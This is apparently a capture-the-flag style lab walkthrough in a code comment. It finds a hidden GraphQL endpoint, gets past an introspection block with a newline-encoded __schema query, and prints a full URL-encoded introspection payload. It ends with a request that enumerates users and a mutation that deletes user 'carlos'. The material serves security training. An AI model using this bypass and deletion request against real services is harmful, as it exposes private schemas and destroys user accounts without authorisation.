/*

The user mgmnt functions are powered by a hidden GraphQL endpoint. 
You won't be able to find this endpoint by simply clicking pages in the site. 
The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete carlos

1) No graphql request endpoints show up, let's try fuzzing with common endpoints
• /graphql
• /api               // 400 query not present
• /api/graphql
• /graphql/api
• /graphql/graphql
Also try appending /v1 to the path.

2) 
GET /api
// 400 query not present

POST /api 
// method not allowed

GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/2
Content-Type: x-www-form-urlencoded
// body cannot be empty

GET /api?query=query{__schema{queryType{name}}} HTTP/2
//  decoded version
// gets detected

------------------------------------------------------------
GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/2 
Content-Type: x-www-form-urlencoded

200 OK
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}

------------------------------------------------------------
GET /api?query=query{__schema{queryType{name}}} HTTP/2
Content-Type: x-www-form-urlencoded

{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}


4) we can use url encoded full introspection query with a newline after __schema
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

// CTRL+U


5) Save the introspection response body as a local JSON file. and analyse using inql
// 1 
query {
    getUser(id: Int!) {
        id
        username
    }
}

//2
mutation {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}

6) send 1 as query parameter url encoded
GET /api?query={getUser(id:1){id%0d%0ausername}} HTTP/
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator"
    }
  }
}

// id 3 is carlos

7) GET /api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id}}} HTTP/2



*/